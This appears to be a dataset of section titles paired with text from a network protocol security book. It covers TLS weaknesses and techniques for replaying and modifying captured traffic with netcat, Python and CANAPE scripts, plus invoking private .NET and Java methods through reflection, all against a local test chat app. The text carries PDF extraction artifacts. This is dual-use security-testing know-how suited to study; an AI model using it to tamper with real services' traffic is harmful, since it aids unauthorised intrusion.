    "output": "server and the client generate the master key provides replay protection for\nthe connection, because if either endpoint sends a different random during\nnegotiation, the endpoints will generate different master secrets.)\nWhen both endpoints have the master secret, or session key, an\nencrypted connection is possible. The client issues a change cipher spec\npacket to tell the server it will only send encrypted messages from here\non. However, the client needs to send one final message to the server\nbefore normal traffic can be transmitted: the finished packet. This packet\nis encrypted with the session key and contains a hash of all the handshake\nmessages sent and received during the handshake process. This is a crucial\nstep in protecting against a downgrade attack, in which an attacker modifies\nthe handshake process to try to reduce the security of the connection by\nselecting weak encryption algorithms. Once the server receives the finished\nmessage, it can validate that the negotiated session key is correct (other-\nwise, the packet wouldn’t decrypt) and check that the hash is correct. If not,\nit can close the connection. But if all is correct, the server will send its own\nchange cipher spec message to the client, and encrypted communications\ncan begin.\nEach encrypted packet is also verified using an HMAC, which provides\ndata authentication and ensures data integrity. This verification is particu-\nlarly important if a stream cipher, such as RC4, has been negotiated; other-\nwise, the encrypted blocks could be trivially modified.\nMeeting Security Requirements\nThe TLS protocol successfully meets the four security requirements listed at\nthe beginning of this chapter and summarized in Table 7-4.\nTable 7-4: How TLS Meets Security Requirements\nSecurity requirement How it’s met\nData confidentiality Selectable strong cipher suites\nSecure key exchange\nData integrity Encrypted data is protected by an HMAC\nHandshake packets are verified by final hash verification\nServer authentication The client can choose to verify the server endpoint using\nthe PKI and the issued certificate\nClient authentication Optional certificate-based client authentication\nBut there are problems with TLS. The most significant one, which as\nof this writing has not been corrected in the latest versions of the protocol,\nis its reliance on certificate-based PKI. The protocol depends entirely on\ntrust that certificates are issued to the correct people and organizations. If\nthe certificate for a network connection indicates the application is com-\nmunicating to a Google server, you assume that only Google would be able\nto purchase the required certificate. Unfortunately, this isn’t always the\ncase. Situations in which corporations and governments have subverted the\nCA process to generate certificates have been documented. In addition,\n176 Chapter 7\nmistakes have been made when CAs didn’t perform their due diligence and\nissued bad certificates, such as the Google certificate shown in Figure 7-22\nthat eventually had to be revoked.\nFigure 7-22: A certificate for Google “wrongly” issued\nby CA TÜRKTRUST\nOne partial fix to the certificate model is a process called certificate pin-\nning. Pinning means that an application restricts acceptable certificates\nand CA issuers for certain domains. As a result, if someone manages to\nfraudulently obtain a valid certificate for www.google.com, the application\nwill notice that the certificate doesn’t meet the CA restrictions and will fail\nthe connection.\nOf course, certificate pinning has its downsides and so is not applicable\nto every scenario. The most prevalent issue is the management of the pinning\nlist; specifically, building an initial list might not be too challenging a task,\nbut updating the list adds additional burdens. Another issue is that a devel-\noper cannot easily migrate the certificates to another CA or easily change\ncertificates without also having to issue updates to all clients.\nAnother problem with TLS, at least when it comes to network surveil-\nlance, is that a TLS connection can be captured from the network and\nstored by an attacker until it’s needed. If that attacker ever obtains the\nserver’s private key, all historical traffic could be decrypted. For this rea-\nson, a number of network applications are moving toward exchanging keys\nusing the DH algorithm in addition to using certificates for identity verifi-\ncation. This allows for perfect forward secrecy—even if the private key is com-\npromised, it shouldn’t be easy to also calculate the DH-generated key.\nNetwork Protocol Security 177"
  },
  {
    "input": "Final Words",
    "output": "Final words\nThis chapter focused on the basics of protocol security. Protocol security\nhas many aspects and is a very complex topic. Therefore, it’s important to\nunderstand what could go wrong and identify the problem during any pro-\ntocol analysis.\nEncryption and signatures make it difficult for an attacker to capture\nsensitive information being transmitted over a network. The process of\nencryption converts plaintext (the data you want to hide) into cipher text\n(the encrypted data). Signatures are used to verify that the data being\ntransmitted across a network hasn’t been compromised. An appropriate\nsignature can also be used to verify the identity of the sender. The ability to\nverify the sender is very useful for authenticating users and computers over\nan untrusted network.\nAlso described in this chapter are some possible attacks against cryp-\ntography as used in protocol security, including the well-known padding\noracle attack, which could allow an attack to decrypt traffic being sent to\nand from a server. In later chapters, I’ll explain in more detail how to ana-\nlyze a protocol for its security configuration, including the encryption algo-\nrithms used to protect sensitive data.\n178 Chapter 7"
  },
  {
    "input": "Chapter 8: Implementing the Network Protocol\r",
    "output": "8\nImPLEmENTING THE\nNE T WORK P ROTOCOL\nAnalyzing a network protocol can be an end in itself;\nhowever, most likely you’ll want to implement the pro-\ntocol so you can actually test it for security vulnerabili-\nties. In this chapter, you’ll learn ways to implement a\nprotocol for testing purposes. I’ll cover techniques to\nrepurpose as much existing code as possible to reduce\nthe amount of development effort you’ll need to do.\nThis chapter uses my SuperFunkyChat application, which provides\ntesting data and clients and servers to test against. Of course, you can use\nany protocol you like: the fundamentals should be the same."
  },
  {
    "input": "Capturing Traffic with Netcat ",
    "output": "replaying existing captured network traffic\nIdeally, we want to do only the minimum necessary to implement a client or\nserver for security testing. One way to reduce the amount of effort required\nis to capture example network protocol traffic and replay it to real clients\nor servers. We’ll look at three ways to achieve this goal: using Netcat to send\nraw binary data, using Python to send UDP packets, and repurposing our\nanalysis code in Chapter 5 to implement a client and a server.\nCapturing Traffic with Netcat\nNetcat is the simplest way to implement a network client or server. The\nbasic Netcat tool is available on most platforms, although there are mul-\ntiple versions with different command line options. (Netcat is sometimes\ncalled nc or netcat.) We’ll use the BSD version of Netcat, which is used on\nmacOS and is the default on most Linux systems. You might need to adapt\ncommands if you’re on a different operating system.\nThe first step when using Netcat is to capture some traffic you want to\nreplay. We’ll use the Tshark command line version of Wireshark to capture\ntraffic generated by SuperFunkyChat. (You may need to install Tshark on\nyour platform.)\nTo limit our capture to packets sent to and received by our ChatServer\nrunning on TCP port 12345, we’ll use a Berkeley Packet Filter (BPF) expres-\nsion to restrict the capture to a very specific set of packets. BPF expres-\nsions limit the packets captured, whereas Wireshark’s display filter limits\nonly the display of a much larger set of capture packets.\nRun the following command at the console to begin capturing port\n12345 traffic and writing the output to the file capture.pcap. Replace INTNAME\nwith the name of the interface you’re capturing from, such as eth0.\n$ tshark -i INTNAME -w capture.pcap tcp port 12345\nMake a client connection to the server to start the packet capture and\nthen stop the capture by pressing cTRl+C in the console running Tshark.\nMake sure you’ve captured the correct traffic into the output file by run-\nning Tshark with the -r parameter and specifying the capture.pcap file.\nListing 8-1 shows example output from Tshark with the addition of the\nparameters -z conv,tcp to print the list of capture conversations.\n$ tshark -r capture.pcap -z conv,tcp\n 1 0 192.168.56.1 192.168.56.100 TCP 66 26082 12345 [SYN]\n2 0.000037695 192.168.56.100 192.168.56.1 TCP 66 12345 26082 [SYN, ACK]\n3 0.000239814 192.→168.56.1 192.168.56.100 TCP →60 26082 12345 [ACK]\n4 0.007160883 192.168.56.1 →192.168.56.100 TCP 60 26082 → 12345 [PSH, ACK]\n5 0.007225155 192.168.56.10→0 192.168.56.1 TCP 54 12345 → 26082 [ACK]\n--snip-- → →\n→ →\n180 Chapter 8\n================================================================================\nTCP Conversations\nFilter:<No Filter>\n| <- | | -> |\n| Frames Bytes | | Frames Bytes |\n192.168.56.1:26082 <-> 192.168.56.100:12345 17 1020 28 1733x\n================================================================================\nListing 8-1: Verifying the capture of the chat protocol traffic\nAs you can see in Listing 8-1, Tshark prints the list of raw packets at \nand then displays the conversation summary , which shows that we have a\nconnection going from 192.168.56.1 port 26082 to 192.168.56.100 port 12345.\nThe client on 192.168.56.1 has received 17 frames or 1020 bytes of data ,\nand the server received 28 frames or 1733 bytes of data x.\nNow we use Tshark to export just the raw bytes for one direction of the\nconversation:\n$ tshark -r capture.pcap -T fields -e data 'tcp.srcport==26082' > outbound.txt\nThis command reads the packet capture and outputs the data from\neach packet; it doesn’t filter out items like duplicate or out-of-order packets.\nThere are a couple of details to note about this command. First, you should\nuse this command only on captures produced on a reliable network, such\nas via localhost or a local network connection, or you might see erroneous\npackets in the output. Second, the data field is only available if the protocol\nisn’t decoded by a dissector. This is not an issue with the TCP capture, but\nwhen we move to UDP, we’ll need to disable dissectors for this command to\nwork correctly.\nRecall that at  in Listing 8-1, the client session was using port 26082.\nThe display filter tcp.srcport==26082 removes all traffic from the output that\ndoesn’t have a TCP source port of 26082. This limits the output to traffic\nfrom the client to the server. The result is the data in hex format, similar to\nListing 8-2.\n$ cat outbound.txt\n42494e58\n0000000d\n00000347\n00\n057573657231044f4e595800\n--snip--\nListing 8-2: Example output from dumping raw traffic\nNext, we convert this hex output to raw binary. The simplest way to do so\nis with the xxd tool, which is installed by default on most Unix-like systems.\nRun the xxd command, as shown in Listing 8-3, to convert the hex dump to\na binary file. (The -p parameter converts raw hex dumps rather than the\ndefault xxd format of a numbered hex dump.)\nImplementing the Network Protocol 181"
  },
  {
    "input": "Using Python to Resend Captured UDP Traffic",
    "output": "$ xxd -p -r outbound.txt > outbound.bin\n$ xxd outbound.bin\n00000000: 4249 4e58 0000 000d 0000 0347 0005 7573 BINX.......G..us\n00000010: 6572 3104 4f4e 5958 0000 0000 1c00 0009 er1.ONYX........\n00000020: 7b03 0575 7365 7231 1462 6164 6765 7220 {..user1.badger\n--snip--\nListing 8-3: Converting the hex dump to binary data\nFinally, we can use Netcat with the binary data file. Run the following\nnetcat command to send the client traffic in outbound.bin to a server at\nHOSTNAME port 12345. Any traffic sent from the server back to the client will\nbe captured in inbound.bin.\n$ netcat HOSTNAME 12345 < outbound.bin > inbound.bin\nYou can edit outbound.bin with a hex editor to change the session data\nyou’re replaying. You can also use the inbound.bin file (or extract it from a\nPCAP) to send traffic back to a client by pretending to be the server using\nthe following command:\n$ netcat -l 12345 < inbound.bin > new_outbound.bin\nUsing Python to Resend Captured UDP Traffic\nOne limitation of using Netcat is that although it’s easy to replay a stream-\ning protocol such as TCP, it’s not as easy to replay UDP traffic. The reason\nis that UDP traffic needs to maintain packet boundaries, as you saw when\nwe tried to analyze the Chat Application protocol in Chapter 5. However,\nNetcat will just try to send as much data as it can when sending data from a\nfile or a shell pipeline.\nInstead, we’ll write a very simple Python script that will replay the\nUDP packets to the server and capture any results. First, we need to cap-\nture some UDP example chat protocol traffic using the ChatClient’s --udp\ncommand line parameter. Then we’ll use Tshark to save the packets to the\nfile udp_capture.pcap, as shown here:\ntshark -i INTNAME -w udp_capture.pcap udp port 12345\nNext, we’ll again convert all client-to-server packets to hex strings so we\ncan process them in the Python client:\ntshark -T fields -e data -r udp_capture.pcap --disable-protocol gvsp/\n\"udp.dstport==12345\" > udp_outbound.txt\nOne difference in extracting the data from the UDP capture is that\nTshark automatically tries to parse the traffic as the GVSP protocol. This\nresults in the data field not being available. Therefore, we need to disable\nthe GVSP dissector to create the correct output.\n182 Chapter 8"
  },
  {
    "input": "Repurposing Our Analysis Proxy",
    "output": "With a hex dump of the packets, we can finally create a very simple\nPython script to send the UDP packets and capture the response. Copy\nListing 8-4 into udp_client.py.\nudp_client.py import sys\nimport binascii\nfrom socket import socket, AF_INET, SOCK_DGRAM\nif len(sys.argv) < 3:\nprint(\"Specify destination host and port\")\nexit(1)\n# Create a UDP socket with a 1sec receive timeout\nsock = socket(AF_INET, SOCK_DGRAM)\nsock.settimeout(1)\naddr = (sys.argv[1], int(sys.argv[2]))\nfor line in sys.stdin:\nmsg = binascii.a2b_hex(line.strip())\nsock.sendto(msg, addr)\ntry:\ndata, server = sock.recvfrom(1024)\nprint(binascii.b2a_hex(data))\nexcept:\npass\nListing 8-4: A simple UDP client to send network traffic capture\nRun the Python script using following command line (it should work in\nPython 2 and 3), replacing HOSTNAME with the appropriate host:\npython udp_client.py HOSTNAME 12345 < udp_outbound.txt\nThe server should receive the packets, and any received packets in the\nclient should be printed to the console as binary strings.\nRepurposing Our Analysis Proxy\nIn Chapter 5, we implemented a simple proxy for SuperFunkyChat that cap-\ntured traffic and implemented some basic traffic parsing. We can use the\nresults of that analysis to implement a network client and a network server\nto replay and modify traffic, allowing us to reuse much of our existing work\ndeveloping parsers and associated code rather than having to rewrite it for\na different framework or language.\nCapturing Example Traffic\nBefore we can implement a client or a server, we need to capture some traf-\nfic. We’ll use the parser.csx script we developed in Chapter 5 and the code in\nListing 8-5 to create a proxy to capture the traffic from a connection.\nImplementing the Network Protocol 183\nchapter8_capture #load \"parser.csx\"\n_proxy.csx using static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\nvar template = new FixedProxyTemplate();\n// Local port of 4444, destination 127.0.0.1:12345\ntemplate.LocalPort = 4444;\ntemplate.Host = \"127.0.0.1\";\ntemplate.Port = 12345;\n template.AddLayer<Parser>();\nvar service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\nWriteLine(\"Writing Outbound Packets to packets.bin\");\n service.Packets.WriteToFile(\"packets.bin\", \"Out\");\nListing 8-5: The proxy to capture chat traffic to a file\nListing 8-5 sets up a TCP listener on port 4444, forwards new connec-\ntions to 127.0.0.1 port 12345, and captures the traffic. Notice that we still add\nour parsing code to the proxy at  to ensure that the captured data has the\ndata portion of the packet, not the length or checksum information. Also\nnotice that at , we write the packets to a file, which will include all outbound\nand inbound packets. We’ll need to filter out a specific direction of traffic\nlater to send the capture over the network.\nRun a single client connection through this proxy and exercise the cli-\nent a good bit. Then close the connection in the client and press ENTER in\nthe console to exit the proxy and write the packet data to packets.bin. (Keep a\ncopy of this file; we’ll need it for our client and server.)\nImplementing a Simple Network Client\nNext, we’ll use the captured traffic to implement a simple network client.\nTo do so, we’ll use the NetClientTemplate class to establish a new connection\nto the server and provide us with an interface to read and write network\npackets. Copy Listing 8-6 into a file named chapter8_client.csx.\nchapter8 #load \"parser.csx\"\n_client.csx\nusing static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\n if (args.Length < 1) {\nWriteLine(\"Please Specify a Capture File\");\nreturn;\n}\n184 Chapter 8\n var template = new NetClientTemplate();\ntemplate.Port = 12345;\ntemplate.Host = \"127.0.0.1\";\ntemplate.AddLayer<Parser>();\n template.InitialData = new byte[] { 0x42, 0x49, 0x4E, 0x58 };\nx var packets = LogPacketCollection.ReadFromFile(args[0]);\ny using(var adapter = template.Connect()) {\nWriteLine(\"Connected\");\n// Write packets to adapter\nz foreach(var packet in packets.GetPacketsForTag(\"Out\")) {\nadapter.Write(packet.Frame);\n}\n// Set a 1000ms timeout on read so we disconnect\nadapter.ReadTimeout = 1000;\n{ DataFrame frame = adapter.Read();\nwhile(frame != null) {\nWritePacket(frame);\nframe = adapter.Read();\n}\n}\nListing 8-6: A simple client to replace SuperFunkyChat traffic\nOne new bit in this code is that each script gets a list of command line\narguments in the args variable . By using command line arguments, we can\nspecify different packet capture files without having to modify the script.\nThe NetClientTemplate is configured  similarly to our proxy, making\nconnections to 127.0.0.1:12345 but with a few differences to support the\nclient. For example, because we parse the initial network traffic inside the\nParser class, our capture file doesn’t contain the initial magic value that the\nclient sends to the server. We add an InitialData array to the template with\nthe magic bytes  to correctly establish the connection.\nWe then read the packets from the file x into a packet collection. When\neverything is configured, we call Connect() to establish a new connection to\nthe server y. The Connect() method returns a Data Adapter that allows us to\nread and write parsed packets on the connection. Any packet we read will\nalso go through the Parser and remove the length and checksum fields.\nNext, we filter the loaded packets to only outbound and write them to\nthe network connection z. The Parser class again ensures that any data\npackets we write have the appropriate headers attached before being sent\nto the server. Finally, we read out packets and print them to the console\nuntil the connection is closed or the read times out {.\nWhen you run this script, passing the path to the packets we captured\nearlier, it should connect to the server and replay your session. For example,\nany message sent in the original capture should be re-sent.\nOf course, just replaying the original traffic isn’t necessarily that use-\nful. It would be more useful to modify traffic to test features of the proto-\ncol, and now that we have a very simple client, we can modify the traffic by\nImplementing the Network Protocol 185\nadding some code to our send loop. For example, we might simply change\nour username in all packets to something else—say from user1 to bobsmith—\nby replacing the inner code of the send loop (at z in Listing 8-6) with the\ncode shown in Listing 8-7.\n string data = packet.Frame.ToDataString();\n data = data.Replace(\"\\u0005user1\", \"\\u0008bobsmith\");\nadapter.Write(data.ToDataFrame());\nListing 8-7: A simple packet editor for the client\nTo edit the username, we first convert the packet into a format we\ncan work with easily. In this case, we convert it to a binary string using\nthe ToDataString() method , which results in a C# string where each byte\nis converted directly to the same character value. Because the strings in\nSuperFunkyChat are prefixed with their length, at  we use the \\uXXXX\nescape sequence to replace the byte 5 with 8 for the new length of the user-\nname. You can replace any nonprintable binary character in the same way,\nusing the escape sequence for the byte values.\nWhen you rerun the client, all instances of user1 should be replaced\nwith bobsmith. (Of course, you can do far more complicated packet modifi-\ncation at this point, but I’ll leave that for you to experiment with.)\nImplementing a Simple Server\nWe’ve implemented a simple client, but security issues can occur in both\nthe client and server applications. So now we’ll implement a custom server\nsimilar to what we’ve done for the client.\nFirst, we’ll implement a small class to act as our server code. This class\nwill be created for every new connection. A Run() method in the class will\nget a Data Adapter object, essentially the same as the one we used for the\nclient. Copy Listing 8-8 into a file called chat_server.csx.\nchat_server.csx using CANAPE.Nodes;\nusing CANAPE.DataAdapters;\nusing CANAPE.Net.Templates;\n class ChatServerConfig {\npublic LogPacketCollection Packets { get; private set; }\npublic ChatServerConfig() {\nPackets = new LogPacketCollection();\n}\n}\n class ChatServer : BaseDataEndpoint<ChatServerConfig> {\npublic override void Run(IDataAdapter adapter, ChatServerConfig config) {\nConsole.WriteLine(\"New Connection\");\n DataFrame frame = adapter.Read();\n// Wait for the client to send us the first packet\nif (frame != null) {\n186 Chapter 8\n// Write all packets to client\nx foreach(var packet in config.Packets) {\nadapter.Write(packet.Frame);\n}\n}\nframe = adapter.Read();\n}\n}\nListing 8-8: A simple server class for chat protocol\nThe code at  is a configuration class that simply contains a log\npacket collection. We could have simplified the code by just specifying\nLogPacketCollection as the configuration type, but doing so with a distinct\nclass demonstrates how you might add your own configuration more easily.\nThe code at  defines the server class. It contains the Run() function,\nwhich takes a data adapter and the server configuration, and allows us to\nread and write to the data adapter after waiting for the client to send us\na packet . Once we’ve received a packet, we immediately send our entire\npacket list to the client x.\nNote that we don’t filter the packets at x, and we don’t specify that we’re\nusing any particular parser for the network traffic. In fact, this entire class is\ncompletely agnostic to the SuperFunkyChat protocol. We configure much of\nthe behavior for the network server inside a template, as shown in Listing 8-9.\nchapter8  #load \"chat_server.csx\"\n_example #load \"parser.csx\"\n_server.csx using static System.Console;\nif (args.Length < 1) {\nWriteLine(\"Please Specify a Capture File\");\nreturn;\n}\n var template = new NetServerTemplate<ChatServer, ChatServerConfig>();\ntemplate.LocalPort = 12345;\ntemplate.AddLayer<Parser>();\n var packets = LogPacketCollection.ReadFromFile(args[0])\n.GetPacketsForTag(\"In\");\ntemplate.ServerFactoryConfig.Packets.AddRange(packets);\nx var service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\nListing 8-9: A simple example ChatServer\nListing 8-9 might look familiar because it’s very similar to the script\nwe used for the DNS server in Listing 2-11. We begin by loading in the\nchat_server.csx script to define our ChatServer class . Next, we create a\nImplementing the Network Protocol 187"
  },
  {
    "input": "Repurposing Existing Executable Code",
    "output": "server template at  by specifying the type of the server and the configu-\nration type. Then we load the packets from the file passed on the com-\nmand line, filtering to capture only inbound packets and adding them to\nthe packet collection in the configuration . Finally, we create a service\nand start it x, just as we do proxies. The server is now listening for new\nconnections on TCP port 12345.\nTry the server with the ChatClient application; the captured traffic\nshould be sent back to the client. After all the data has been sent to the\nclient, the server will automatically close the connection. As long as you\nobserve the message we re-sent, don’t worry if you see an error in the\nChatClient’s output. Of course, you can add functionality to the server,\nsuch as modifying traffic or generating new packets.\nrepurposing existing executable code\nIn this section, we’ll explore various ways to repurpose existing binary\nexecutable code to reduce the amount of work involved in implementing\na protocol. Once you’ve determined a protocol’s details by reverse engi-\nneering the executable (perhaps using some tips from Chapter 6), you’ll\nquickly realize that if you can reuse the executable code, you’ll avoid hav-\ning to implement the protocol.\nIdeally, you’ll have the source code you’ll need to implement a particu-\nlar protocol, either because it’s open source or the implementation is in a\nscripting language like Python. If you do have the source code, you should\nbe able to recompile or directly reuse the code in your own application.\nHowever, when the code has been compiled into a binary executable, your\noptions can be more limited. We’ll look at each scenario now.\nManaged language platforms, such as .NET and Java, are by far the\neasiest in which to reuse existing executable code, because they have a well-\ndefined metadata structure in compiled code that allows a new application\nto be compiled against internal classes and methods. In contrast, in many\nunmanaged platforms, such as C/C++, the compiler will make no guarantees\nthat any component inside a binary executable can be easily called externally.\nWell-defined metadata also supports reflection, which is the ability of an\napplication to support late binding of executable code to inspect data at\nruntime and to execute arbitrary methods. Although you can easily decom-\npile many managed languages, it may not always be convenient to do so,\nespecially when dealing with obfuscated applications. This is because the\nobfuscation can prevent reliable decompilation to usable source code.\nOf course, the parts of the executable code you’ll need to execute will\ndepend on the application you’re analyzing. In the sections that follow, I’ll\ndetail some coding patterns and techniques to use to call the appropriate\nparts of the code in .NET and Java applications, the platforms you’re most\nlikely to encounter.\n188 Chapter 8"
  },
  {
    "input": "Repurposing Code in .NET Applications",
    "output": "Repurposing Code in .NET Applications\nAs discussed in Chapter 6, .NET applications are made up of one or more\nassemblies, which can be either an executable (with an .exe extension) or a\nlibrary (.dll). When it comes to repurposing existing code, the form of the\nassembly doesn’t matter because we can call methods in both equally.\nWhether we can just compile our code against the assembly’s code will\ndepend on the visibility of the types we’re trying to use. The .NET plat-\nform supports different visibility scopes for types and members. The three\nmost important forms of visibility scope are public, private, and internal.\nPublic types or members are available to all callers outside the assembly.\nPrivate types or members are limited in scope to the current type (for\nexample, you can have a private class inside a public class). Internal vis-\nibility scopes the types or members to only callers inside the same assem-\nbly, where they act as if they were public (although an external call cannot\ncompile against them). For example, consider the C# code in Listing 8-10.\n public class PublicClass\n{\nprivate class PrivateClass\n{\n public PrivatePublicMethod() {}\n}\ninternal class InternalClass\n{\n public void InternalPublicMethod() {}\n}\nprivate void PrivateMethod() {}\ninternal void InternalMethod() {}\nx public void PublicMethod() {}\n}\nListing 8-10: Examples of .NET visibility scopes\nListing 8-10 defines a total of three classes: one public, one private, and\none internal. When you compile against the assembly containing these types,\nonly PublicClass can be directly accessed along with the class’s PublicMethod()\n(indicated by  and x); attempting to access any other type or member will\ngenerate an error in the compiler. But notice at  and  that public mem-\nbers are defined. Can’t we also access those members? Unfortunately, no,\nbecause these members are contained inside the scope of a PrivateClass or\nInternalClass. The class’s scope takes precedence over the members’ visibility.\nOnce you’ve determined whether all the types and members you want\nto use are public, you can add a reference to the assembly when compiling.\nIf you’re using an IDE, you should find a method that allows you to add\nthis reference to your project. But if you’re compiling on the command line\nusing Mono or the Windows .NET framework, you’ll need to specify the\n-reference:<FILEPATH> option to the appropriate C# compiler, CSC or MCS.\nImplementing the Network Protocol 189\nUsing the Reflection APIs\nIf all the types and members are not public, you’ll need to use the .NET\nframework’s Reflection APIs. You’ll find most of these in the System\n.Reflection namespace, except for the Type class, which is under the System\nnamespace. Table 8-1 lists the most important classes with respect to reflec-\ntion functionality.\nTable 8-1:  .NET Reflection Types\nClass name Description\nSystem.Type Represents a single type in an assembly and\nallows access to information about its members\nSystem.Reflection.Assembly Allows access to loading and inspecting an\nassembly as well as enumerating available types\nSystem.Reflection.MethodInfo Represents a method in a type\nSystem.Reflection.FieldInfo Represents a field in a type\nSystem.Reflection.PropertyInfo Represents a property in a type\nSystem.Reflection.ConstructorInfo Represents a class’s constructor\nLoading the Assembly\nBefore you can do anything with the types and members, you’ll need to\nload the assembly using the Load() or the LoadFrom() method on the Assembly\nclass. The Load() method takes an assembly name, which is an identifier for\nthe assembly that assumes the assembly file can be found in the same loca-\ntion as the calling application. The LoadFrom() method takes the path to the\nassembly file.\nFor the sake of simplicity, we’ll use LoadFrom(), which you can use in\nmost cases. Listing 8-11 shows a simple example of how you might load an\nassembly from a file and extract a type by name.\nAssembly asm = Assembly.LoadFrom(@\"c:\\path\\to\\assembly.exe\");\nType type = asm.GetType(\"ChatProgram.Connection\");\nListing 8-11: A simple assembly loading example\nThe name of the type is always the fully qualified name including\nits namespace. For example, in Listing 8-11, the name of the type being\naccessed is Connection inside the ChatProgram namespace. Each part of the\ntype name is separated by periods.\nHow do you access classes that are declared inside other classes, such as\nthose shown in Listing 8-10? In C#, you access these by specifying the parent\nclass name and the child class name separated by periods. The framework is\nable to differentiate between ChatProgram.Connection, where we want the class\nConnection in namespace ChatProgram, and the child class Connection inside the\nclass ChatProgram by using a plus (+) symbol: ChatProgram+Connection represents\na parent/child class relationship.\n190 Chapter 8\nListing 8-12 shows a simple example of how we might create an instance\nof an internal class and call methods on it. We’ll assume that the class is\nalready compiled into its own assembly.\ninternal class Connection\n{\ninternal Connection() {}\npublic void Connect(string hostname)\n{\nConnect(hostname, 12345);\n}\nprivate void Connect(string hostname, int port)\n{\n// Implementation...\n}\npublic void Send(byte[] packet)\n{\n// Implementation...\n}\npublic void Send(string packet)\n{\n// Implementation...\n}\npublic byte[] Receive()\n{\n// Implementation...\n}\n}\nListing 8-12: A simple C# example class\nThe first step we need to take is to create an instance of this Connection\nclass. We could do this by calling GetConstructor on the type and calling it\nmanually, but sometimes there’s an easier way. One way would be to use\nthe built-in System.Activator class to handle creating instances of types for\nus, at least in very simple scenarios. In such a scenario, we call the method\nCreateInstance(), which takes an instance of the type to create and a Boolean\nvalue that indicates whether the constructor is public or not. Because the con-\nstructor is not public (it’s internal), we need to pass true to get the activator to\nfind the right constructor.\nListing 8-13 shows how to create a new instance, assuming a nonpublic\nparameterless constructor.\nType type = asm.GetType(\"ChatProgram.Connection\");\nobject conn = Activator.CreateInstance(type, true);\nListing 8-13: Constructing a new instance of the Connection object\nImplementing the Network Protocol 191\nAt this point, we would call the public Connect() method.\nIn the possible methods of the Type class, you’ll find the GetMethod()\nmethod, which just takes the name of the method to look up and returns\nan instance of a MethodInfo type. If the method cannot be found, null is\nreturned. Listing 8-14 shows how to execute the method by calling the\nInvoke() method on MethodInfo, passing the instance of the object to exe-\ncute it on and the parameters to pass to the method.\nMethodInfo connect_method = type.GetMethod(\"Connect\");\nconnect_method.Invoke(conn, new object[] { \"host.badgers.com\" });\nListing 8-14: Executing a method on a Connection object\nThe simplest form of GetMethod() takes as a parameter the name of the\nmethod to find, but it will look for only public methods. If instead you want\nto call the private Connect() method to be able to specify an arbitrary TCP\nport, use one of the various overloads of GetMethod(). These overloads take a\nBindingFlags enumeration value, which is a set of flags you can pass to reflec-\ntion functions to determine what sort of information you want to look up.\nTable 8-2 shows some important flags.\nTable 8-2: Important  .NET Reflection Binding Flags\nFlag name Description\nBindingFlags.Public Look up public members\nBindingFlags.NonPublic Look up nonpublic members (internal or private)\nBindingFlags.Instance Look up members that can only be used on an instance of\nthe class\nBindingFlags.Static Look up members that can be accessed statically without an\ninstance\nTo get a MethodInfo for the private method, we can use the overload of\nGetMethod(), as shown in Listing 8-15, which takes a name and the binding\nflags. We’ll need to specify both NonPublic and Instance in the flags because\nwe want a nonpublic method that can be called on instances of the type.\nMethodInfo connect_method = type.GetMethod(\"Connect\",\nBindingFlags.NonPublic | BindingFlags.Instance);\nconnect_method.Invoke(conn, new object[] { \"host.badgers.com\", 9999 });\nListing 8-15: Calling a nonpublic Connect() method\nSo far so good. Now we need to call the Send() method. Because this\nmethod is public, we should be able to call the basic GetMethod() method. But\ncalling the basic method generates the exception shown in Listing 8-16, indi-\ncating an ambiguous match. What’s gone wrong?\nSystem.Reflection.AmbiguousMatchException: Ambiguous match found.\nat System.RuntimeType.GetMethodImpl(...)\n192 Chapter 8"
  },
  {
    "input": "Repurposing Code in Java Applications",
    "output": "at System.Type.GetMethod(String name)\nat Program.Main(String[] args)\nListing 8-16: An exception thrown for the Send() method\nNotice in Listing 8-12 the Connection class has two Send() methods: one\ntakes an array of bytes and the other takes a string. Because the reflection\nAPI doesn’t know which method you want, it doesn’t return a reference to\neither; instead, it just throws an exception. Contrast this with the Connect()\nmethod, which worked because the binding flags disambiguate the call. If\nyou’re looking up a public method with the name Connect(), the reflection\nAPIs will not even inspect the nonpublic overload.\nWe can get around this error by using yet another overload of GetMethod()\nthat specifies exactly the types we want the method to support. We’ll choose\nthe method that takes a string, as shown in Listing 8-17.\nMethodInfo send_method = type.GetMethod(\"Send\", new Type[] { typeof(string) });\nsend_method.Invoke(conn, new object[] { \"data\" });\nListing 8-17: Calling the Send(string) method\nFinally, we can call the Receive() method. It’s public, so there are no\nadditional overloads and it should be simple. Because Receive() takes no\nparameters, we can either pass an empty array or null to Invoke(). Because\nInvoke() returns an object, we need to cast the return value to a byte array to\naccess the bytes directly. Listing 8-18 shows the final implementation.\nMethodInfo recv_method = type.GetMethod(\"Receive\");\nbyte[] packet = (byte[])recv_method.Invoke(conn, null);\nListing 8-18: Calling the Receive() method\nRepurposing Code in Java Applications\nJava is fairly similar to .NET, so I’ll just focus on the difference between them,\nwhich is that Java does not have the concept of an assembly. Instead, each\nclass is represented by a separate .class file. Although you can combine class\nfiles into a Java Archive (JAR) file, it is just a convenience feature. For that\nreason, Java does not have internal classes that can only be accessed by other\nclasses in the same assembly. However, Java does have a somewhat similar\nfeature called package-private scoped classes, which can only be accessed by\nclasses in the same package. (.NET refers to packages as a namespace.)\nThe upshot of this feature is that if you want to access classes marked as\npackage scoped, you can write some Java code that defines itself in the same\npackage, which can then access the package-scoped classes and members\nat will. For example, Listing 8-19 shows a package-private class that would\nbe defined in the library you want to call and a simple bridge class you can\ncompile into your own application to create an instance of the class.\nImplementing the Network Protocol 193\n// Package-private (PackageClass.java)\npackage com.example;\nclass PackageClass {\nPackageClass() {\n}\nPackageClass(String arg) {\n}\n@Override\npublic String toString() {\nreturn \"In Package\";\n}\n}\n// Bridge class (BridgeClass.java)\npackage com.example;\npublic class BridgeClass {\npublic static Object create() {\nreturn new PackageClass();\n}\n}\nListing 8-19: Implementing a bridge class to access a package-private class\nYou specify the existing class or JAR files by adding their locations to\nthe Java classpath, typically by specifying the -classpath parameter to the\nJava compiler or Java runtime executable.\nIf you need to call Java classes by reflection, the core Java reflection types\nare very similar to those described in the preceding .NET section: Type in\n.NET is class in Java, MethodInfo is Method, and so on. Table 8-3 contains a short\nlist of Java reflection types.\nTable 8-3: Java Reflection Types\nClass name Description\njava.lang.Class 